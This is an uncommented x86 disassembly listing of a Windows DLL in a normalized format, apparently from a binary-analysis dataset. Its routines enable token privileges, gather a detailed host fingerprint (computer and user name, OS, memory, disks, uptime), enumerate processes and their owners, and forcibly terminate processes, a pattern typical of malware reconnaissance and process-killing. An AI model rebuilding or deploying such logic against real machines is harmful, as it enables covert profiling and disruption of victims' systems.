sub_71001000
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov edi [ LookupPrivilegeValueA@IAT ]
lea eax [ ebp - 0xc ]
push eax
push r--data
xor esi esi
push esi
call edi
mov eax [ ebp - 0xc ]
mov ebx [ AdjustTokenPrivileges@IAT ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
push esi
push esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] 0x2
call ebx
lea eax [ ebp - 0xc ]
push eax
push r--data
push esi
call edi
mov eax [ ebp - 0xc ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
push esi
push esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] 0x2
call ebx
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_7100109e
push ebp
lea ebp [ esp - 0x684 ]
sub esp 0x704
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x680 ] eax
push ebx
push esi
push edi
mov ebx 0x200
push ebx
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
mov esi 0x2000
push esi
call [ malloc@IAT ]
push esi
push 0x0
push eax
mov [ ebp - 0x18 ] eax
call memset
push r--data
push [ ebp - 0x18 ]
call [ sprintf@IAT ]
add esp 0x24
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x280 ]
push eax
mov [ ebp - 0x1c ] 0x10
call [ GetComputerNameA@IAT ]
mov edi [ ebp - 0x18 ]
dec edi
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x280 ]
movsd [ edi ] [ esi ]
mov edx eax
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x18 ]
sub eax edx
dec edi
push ebx
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x280 ]
push eax
mov [ ebp - 0x1c ] ebx
call [ GetUserNameA@IAT ]
mov edi [ ebp - 0x18 ]
dec edi
test eax eax
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x18 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi r--data
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp + 0x280 ]
movsb [ edi ] [ esi ]
mov edx eax
push 0x5
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x18 ]
sub eax edx
dec edi
lea eax [ ebp - 0x80 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x68 ]
sub eax 0x182
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x18 ]
dec edi
mov esi r--data
sub eax 0x64
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
sub eax 0x0
je r-xdata
mov edi [ ebp - 0x18 ]
dec edi
mov esi r--data
jmp r-xdata
sub eax 0x64
je r-xdata
push 0x5
pop ecx
mov esi r--data
lea edi [ ebp + 0x280 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
dec eax
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
push 0x5
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jmp r-xdata
lea edi [ ebp + 0x80 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi r--data
jmp r-xdata
sub eax 0xd56
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x18 ]
sub eax esi
dec edi
push 0x5
pop ecx
mov esi r--data
lea edi [ ebp + 0x280 ]
[ edi ] [ esi ]
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call GetSystemPowerStatus
push ebx
mov esi eax
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
add esp 0xc
test esi esi
je r-xdata
mov esi r--data
lea edi [ ebp + 0x80 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov esi r--data
lea edi [ ebp + 0x80 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x18 ]
dec edi
push ebx
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0x80 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
lea eax [ ebp + 0x280 ]
push [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x480 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp + 0x480 ]
add esp 0x28
mov esi eax
mov esi r--data
lea edi [ ebp + 0x280 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp + 0x280 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push r--data
cmp [ ebp - 0x3b ] 0x80
je r-xdata
push ebx
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x18 ]
sub eax esi
dec edi
cmp [ ebp - 0x3b ] 0xff
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ GetTickCount@IAT ]
push ebx
mov esi eax
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
test esi esi
mov [ ebp - 0x20 ] esi
fild [ ebp - 0x20 ]
jge r-xdata
push r--data
jmp r-xdata
fdiv [ r--data ]
lea eax [ ebp + 0x480 ]
fstp [ esp + 0x4 ]
mov [ esp ] r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp + 0x480 ]
add esp 0x10
mov esi eax
fadd [ r--data ]
lea eax [ ebp + 0x480 ]
push eax
call [ sprintf@IAT ]
pop ecx
lea eax [ ebp + 0x480 ]
pop ecx
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x18 ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
lea eax [ ebp + 0x480 ]
push 0x0
[ edi ] [ esi ]
push eax
mov [ ebp - 0x5c ] 0x20
call memset
add esp 0xc
lea eax [ ebp - 0x5c ]
push eax
call [ GlobalMemoryStatus@IAT ]
mov eax [ ebp - 0x48 ]
shr eax 0x14
push eax
mov eax [ ebp - 0x4c ]
shr eax 0x14
push eax
push [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
shr eax 0x14
push eax
lea eax [ ebp + 0x480 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp + 0x480 ]
add esp 0x18
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov ebx [ ebp - 0x18 ]
mov edi ebx
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
mov [ ebp - 0x18 ] 0x43
mov [ ebp - 0x20 ] 0x18
lea eax [ ebp + 0x480 ]
mov edx eax
dec eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
mov [ ebp + 0x480 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
inc [ ebp - 0x18 ]
dec [ ebp - 0x20 ]
jne r-xdata
lea eax [ ebp + 0x480 ]
mov edx eax
dec eax
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
push 0x5
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push [ ebp - 0x18 ]
mov esi [ wsprintfA@IAT ]
mov edi r--data
lea eax [ ebp + 0x480 ]
push edi
push eax
call esi
add esp 0xc
lea eax [ ebp + 0x480 ]
push eax
call [ GetDriveTypeA@IAT ]
sub eax 0x0
je r-xdata
mov edi ebx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
push [ ebp - 0x18 ]
lea eax [ ebp + 0x280 ]
push edi
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp + 0x280 ]
push eax
call [ GetDiskFreeSpaceA@IAT ]
test eax eax
je r-xdata
lea edi [ ebp + 0x480 ]
dec edi
dec eax
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
mov edi ebx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov eax [ ebp - 0x30 ]
imul eax [ ebp - 0x28 ]
shr eax 0xa
mov ecx eax
imul eax [ ebp - 0x24 ]
imul ecx [ ebp - 0x2c ]
push ecx
push eax
push [ ebp - 0x18 ]
lea eax [ ebp + 0x80 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp + 0x80 ]
add esp 0x14
mov ecx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
dec eax
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx [ ebp + 0x680 ]
mov esi r--data
movsw [ edi ] [ esi ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_71006270
add ebp 0x684
leave
retn
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi ebx
sub eax ecx
mov esi ecx
dec edi
mov esi r--data
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x480 ]
movsd [ edi ] [ esi ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
dec eax
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
mov esi r--data
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x480 ]
movsd [ edi ] [ esi ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x480 ]
movsb [ edi ] [ esi ]
mov edx eax
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp + 0x480 ]
movsb [ edi ] [ esi ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebx
sub eax edx
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
jmp r-xdata
sub_71001836
push ebx
push ebp
push esi
push edi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x4 ] ebx
mov edi 0x2000
mov ebp edi
jne r-xdata
push edi
call [ malloc@IAT ]
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
jmp r-xdata
cmp eax ebx
je r-xdata
add ebp edi
push ebp
push [ esi + 0x4 ]
call [ realloc@IAT ]
pop ecx
pop ecx
push 0x0
push ebp
push eax
push 0x5
mov [ esi + 0x4 ] eax
call [ esi ]
sub_710018b4
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
leave
retn 0x8
push esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
xor esi esi
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
push esi
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
pop esi
sub_71001936
push 0x24
push r--data
call sub_71006294
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71001a0c
jmp sub_71001a0c
lea ecx [ ebp - 0x20 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
lea eax [ ebp + 0x8 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x20 ]
mov esi [ GetTokenInformation@IAT ]
call esi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
mov eax [ ebp + 0x8 ]
add eax eax
mov [ ebp + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edi
push 0x1
push [ ebp - 0x20 ]
call esi
mov [ ebp - 0x1c ] eax
call [ GetLastError@IAT ]
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov eax 0x104
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x104 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push [ edi ]
push ebx
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x1c ] eax
sub_71001a0c
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_710062d9
retn 0x8
push [ ebp - 0x28 ]
call ??3@YAXPAX@Z
pop ecx
sub_71001a44
push ecx
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
pop edi
push edi
mov [ esp + 0x14 ] ecx
call esi
push edi
mov ebp eax
push 0x0
push ebp
call memset
push edi
call esi
push edi
mov esi eax
push 0x0
push esi
call memset
mov ecx [ esp + 0x30 ]
add esp 0x20
push 0x1
push r--data
call sub_710018b4
mov ebx [ esp + 0x18 ]
push ebx
push 0x1
push 0x1f0fff
call [ OpenProcess@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
push [ esp + 0x18 ]
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push 0x0
push r--data
call sub_710018b4
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0x4
push 0x0
push eax
call [ TerminateProcess@IAT ]
test eax eax
push edi
push 0x0
push esi
jne r-xdata
call memset
push ebx
push r--data
push esi
call [ sprintf@IAT ]
mov eax esi
add esp 0x18
mov ecx eax
call memset
push ebx
push r--data
push esi
call [ sprintf@IAT ]
mov eax esi
add esp 0x18
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi ebp
sub eax ecx
dec edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi ebp
sub eax ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push 0x1f4
[ edi ] [ esi ]
call [ Sleep@IAT ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_71001b5b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi 0x2000
push esi
mov ebx ecx
call [ malloc@IAT ]
push esi
xor esi esi
push esi
push eax
mov [ ebp - 0x8 ] eax
call memset
add esp 0x10
mov ecx ebx
call sub_71001836
push esi
push esi
push 0xffffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
push esi
push esi
mov esi [ MultiByteToWideChar@IAT ]
call esi
xor ecx ecx
push 0x2
pop edx
mov edi eax
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
pop ecx
push edi
push eax
push 0xffffffff
push [ ebp + 0x8 ]
xor edi edi
push edi
push edi
mov [ ebp - 0xc ] eax
call esi
cmp [ eax + 0x3c ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0xc ]
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax ]
add ecx eax
mov [ ebx + 0x4 ] ecx
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x4 ] edi
mov [ ebx + 0x4 ] ecx
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x44 ]
mov ecx ebx
call sub_71001a44
mov edx eax
mov eax [ ebx + 0x4 ]
cmp [ eax ] edi
jne r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x8 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor edi edi
sub_71001c45
push ebp
lea ebp [ esp - 0x21a4 ]
mov eax 0x2224
call sub_71006310
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x21a0 ] eax
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi ecx
mov ebx 0x2000
push ebx
mov [ ebp - 0x7c ] edi
call esi
push ebx
push 0x0
push eax
mov [ ebp - 0x74 ] eax
call memset
push ebx
call esi
push ebx
push 0x0
push eax
mov [ ebp - 0x70 ] eax
call memset
add esp 0x20
cmp [ edi + 0x4 ] 0x0
mov [ ebp - 0x69 ] 0x0
jne r-xdata
mov edi [ ebp - 0x74 ]
dec edi
mov ecx edi
call sub_71001836
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
and [ ebp - 0x78 ] 0x0
push 0xf
pop ecx
mov esi r--data
[ edi ] [ esi ]
inc [ ebp - 0x78 ]
mov [ ebp - 0x69 ] 0x1
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x74 ]
sub eax esi
dec edi
push 0x208
lea eax [ ebp - 0x68 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x68 ]
push eax
push [ edi + 0x44 ]
mov ecx esi
call sub_71001936
xor eax eax
push eax
push eax
push ebx
lea ecx [ ebp + 0x1a0 ]
push ecx
mov ecx [ esi + 0x4 ]
push 0xffffffff
push [ ecx + 0x3c ]
push 0x200
push eax
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp + 0x1a0 ]
push eax
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
push r--data
push [ ebp - 0x70 ]
call [ sprintf@IAT ]
mov eax [ ebp - 0x70 ]
add esp 0x10
mov esi eax
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ ebp + 0x9c ]
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea eax [ ebp - 0x68 ]
push eax
je r-xdata
push r--data
push [ ebp - 0x70 ]
call [ sprintf@IAT ]
mov eax [ ebp - 0x70 ]
add esp 0xc
mov esi eax
lea eax [ ebp + 0x9c ]
push eax
push r--data
push [ ebp - 0x70 ]
call [ sprintf@IAT ]
mov eax [ ebp - 0x70 ]
add esp 0x10
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x74 ]
sub eax esi
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x74 ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp - 0x7c ]
mov eax [ ecx + 0x4 ]
mov edx [ eax ]
add edx eax
cmp [ ebp - 0x69 ] 0x0
mov [ ecx + 0x4 ] edx
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x7c ]
mov edi [ esi + 0x4 ]
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x78 ]
push r--data
push [ ebp - 0x70 ]
call [ sprintf@IAT ]
mov eax [ ebp - 0x70 ]
add esp 0xc
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ ebp - 0x74 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebp - 0x74 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x21a0 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71006270
add ebp 0x21a4
leave
retn
sub_71001e53
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
push esi
push edi
push 0xc8
lea eax [ ebp - 0x60 ]
push 0x0
push eax
call memset
xor eax eax
lea edi [ ebp + 0x68 ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
lea eax [ ebp - 0x6c ]
push eax
call [ _time64@IAT ]
lea eax [ ebp - 0x7c ]
push eax
call [ _ftime64@IAT ]
push [ ebp - 0x68 ]
mov ebx [ sprintf@IAT ]
push [ ebp - 0x6c ]
lea eax [ ebp - 0x60 ]
push r--data
push eax
call ebx
movzx eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x68 ]
push r--data
push eax
call ebx
lea eax [ ebp + 0x68 ]
add esp 0x30
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x60 ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x60 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ atoi@IAT ]
mov [ ebp - 0x64 ] eax
fild [ ebp - 0x64 ]
fmul [ r--data ]
call sub_71006376
xor eax 0xb38d5e19
cdq
xor eax edx
sub eax edx
push eax
mov [ rw-data ] eax
lea eax [ ebp - 0x60 ]
push r--data
push eax
call ebx
lea edi [ ebp - 0x60 ]
add esp 0x10
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
push 0xc8
movsw [ edi ] [ esi ]
push 0x0
mov esi rw-data
push esi
call memset
add esp 0xc
xor eax eax
mov cl [ ebp + eax - 0x60 ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
mov eax esi
xor ecx ecx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
test eax eax
jle r-xdata
mov eax [ rw-data ]
push 0x64
pop ecx
pop edi
pop esi
pop ebx
not [ ecx + rw-data ]
mov eax esi
inc ecx
lea edi [ eax + 0x1 ]
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
cmp ecx eax
jl r-xdata
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
